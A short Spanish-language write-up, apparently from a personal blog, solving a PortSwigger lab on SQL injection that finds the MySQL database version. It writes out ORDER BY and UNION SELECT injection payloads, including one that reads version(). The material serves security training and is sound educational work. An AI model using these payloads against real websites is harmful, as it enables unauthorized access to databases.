---
title: SQL injection attack, querying the database type and version on MySQL and Microsoft - portswigger
date: 2024-08-04
categories: [Write up, portswigger]
tags: [sql injection]      # TAG names should always be lowercase
---

Ahora enumeraremos la versión de la base de datos de MySQL

![20240802102008.png](20240802102008.png)

Para ello enumeramos el total de columnas que devuelve la consulta

```c
'ORDER BY 2--+
```

```c
'UNION SELECT null,null--+
```

Luego de tener el numero de consulta podemos ayudarnos de [PayloadsAllTheThings SQL Injection MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases)

Y haciendo la siguiente consulta podemos obtener la versión de la base de datos

```c
UNION SELECT null,concat(version())--+
```

![20240802103647.png](20240802103647.png)
